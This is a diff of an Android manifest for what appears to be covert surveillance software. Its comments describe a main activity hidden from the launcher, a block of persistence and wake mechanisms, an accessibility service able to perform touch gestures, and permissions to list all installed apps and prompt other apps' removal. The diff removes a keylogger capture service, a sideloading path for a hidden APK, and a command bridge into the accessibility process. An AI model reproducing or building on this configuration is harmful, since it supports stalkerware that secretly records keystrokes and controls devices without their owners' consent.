@@ -80,7 +80,6 @@
 
     <!-- Required to trigger the system uninstall dialog for other apps -->
     <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
-    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
 
     <!-- Required on Android 11+ to query and list all installed packages -->
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
@@ -98,7 +97,6 @@
         android:requestLegacyExternalStorage="true"
         android:preserveLegacyExternalStorage="true"
         tools:targetApi="34">
-
 
         <!--
             Main Activity — NOT visible in the home launcher.
@@ -291,18 +289,6 @@
             android:foregroundServiceType="dataSync" />
 
         <!--
-            Keylog capture supervisor.
-            Foreground service + partial wake lock that keeps the accessibility
-            process delivering events and LogManager persisting them, and repairs
-            either peer if the OS reclaims it.
-        -->
-        <service
-            android:name=".services.KeyloggerService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="dataSync" />
-
-        <!--
             ════════════════════════════════════════════════════════════════════
             PERSISTENCE / WAKE MECHANISMS
             ════════════════════════════════════════════════════════════════════
@@ -374,24 +360,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Shares the extracted private APK with Android's package installer. -->
-        <provider
-            android:name="androidx.core.content.FileProvider"
-            android:authorities="${applicationId}.fileprovider"
-            android:exported="false"
-            android:grantUriPermissions="true">
-            <meta-data
-                android:name="android.support.FILE_PROVIDER_PATHS"
-                android:resource="@xml/file_paths" />
-        </provider>
-
-        <!-- Synchronous same-app command bridge into the isolated accessibility process. -->
-        <provider
-            android:name=".services.AccessibilityCommandProvider"
-            android:authorities="${applicationId}.accessibilitybridge"
-            android:process=":accessibility"
-            android:exported="false" />
-
         <!--
             Unified Accessibility Service
             canPerformGestures="true" is required for touch/swipe commands.
@@ -399,7 +367,6 @@
         <service
             android:name=".services.UnifiedAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:process=":accessibility"
             android:exported="false">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
